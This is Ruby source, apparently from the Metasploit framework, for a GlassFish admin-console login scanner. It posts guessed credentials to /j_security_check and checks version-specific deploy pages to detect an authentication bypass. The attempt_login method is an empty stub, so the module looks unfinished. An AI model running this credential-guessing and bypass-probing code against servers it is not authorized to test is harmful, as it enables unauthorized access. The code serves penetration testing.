module Metasploit
  module Framework
    module LoginScanner

      class Glassfish

        include Msf::Exploit::Remote::HttpClient

        CAN_GET_SESSION = false
        DEFAULT_PORT    = 4848
        PRIVATE_TYPES   = [ :password ]

        def set_sane_defaults
          self.uri = "/j_security_check" if self.uri.nil?
          self.method = "POST" if self.method.nil?

          super
        end


        def attempt_login(credential)
        end


        #
        # Reports a successful login attempt
        #
        def log_success(user='',pass='')
          report_auth_info(
            :host   => rhost,
            :port   => rport,
            :sname => (ssl ? 'https' : 'http'),
            :user   => user,
            :pass   => pass,
            :proof  => "WEBAPP=\"GlassFish\", VHOST=#{vhost}",
            :source_type => "user_supplied",
            :active => true
          )
        end


        #
        # Returns the last JSESSION
        #
        def jsession
          @jsession || ''
        end


        #
        # Sets the JSESSION id
        #
        def set_jsession(res)
          if res and res.get_cookies =~ /JSESSIONID=(\w*);/i
            @jsession = $1
          end
        end


        #
        # Send GET or POST request, and return the response
        #
        def send_request(path, method, data=nil, ctype=nil)
          headers = {}
          headers['Cookie'] = "JSESSIONID=#{jsession}" unless jsession.blank?
          headers['Content-Type'] = ctype unless ctype.blank?
          headers['Content-Length'] = data.length unless data.blank?

          uri = normalize_uri(target_uri.path)
          res = send_request_raw({
            'uri'   => "#{uri}#{path}",
            'method'  => method,
            'data'    => data,
            'headers' => headers,
          }, 90)

          set_jsession(res)

          res
        end


        #
        # Try to login to Glassfish with a credential, and return the response
        #
        def try_login(user, pass)
          data  = "j_username=#{Rex::Text.uri_encode(user.to_s)}&"
          data << "j_password=#{Rex::Text.uri_encode(pass.to_s)}&"
          data << 'loginButton=Login'

          send_request('/j_security_check', 'POST', data, 'application/x-www-form-urlencoded')
        end


        #
        # Tries to bypass auth
        #
        def try_glassfish_auth_bypass(version)
          success = false

          if version =~ /^[29]\.x$/
            res = send_request('/applications/upload.jsf', 'get')
            p = /<title>Deploy Enterprise Applications\/Modules/
            if (res and res.code.to_i == 200 and res.body.match(p) != nil)
              success = true
            end
          elsif version =~ /^3\./
            res = send_request('/common/applications/uploadFrame.jsf', 'get')
            p = /<title>Deploy Applications or Modules/
            if (res and res.code.to_i == 200 and res.body.match(p) != nil)
              success = true
            end
          end

          log_success if success

          success
        end


        #
        # Newer editions of Glassfish prevents remote brute-forcing by disabling remote logins..
        # So we need to check this first before actually trying anything.
        #
        def is_secure_admin_disabled?(res)
          return (res.body =~ /Secure Admin must be enabled/) ? true : false
        end


        #
        # Login routine specific to Glfassfish 2 and 9
        #
        def try_glassfish_2(user, pass)
          res = try_login(user,pass)
          if res and res.code == 302
            set_jsession(res)
            res = send_request('/applications/upload.jsf', 'GET')

            p = /<title>Deploy Enterprise Applications\/Modules/
            if (res and res.code.to_i == 200 and res.body.match(p) != nil)
              return true
            end
          end

          false
        end


        #
        # Login routine specific to Glassfish 3 and 4
        #
        def try_glassfish_3(user, pass)
          res = try_login(user,pass, )
          if res and res.code == 302
            set_jsession(res)
            res = send_request('/common/applications/uploadFrame.jsf', 'GET')
            p = /<title>Deploy Applications or Modules/
              if (res and res.code.to_i == 200 and res.body.match(p) != nil)
                return true
              end
            end

          false
        end


        #
        # Tries to login to Glassfish depending on the version
        #
        def try_glassfish_login(version,user,pass)
          success = false

          case version
          when /^[29]\.x$/
            success = try_glassfish_2(user, pass)
          when /^[34]\./
            success = try_glassfish_3(user, pass)
          end

          log_success(user,pass) if success

          success
        end

      end
    end
  end
end

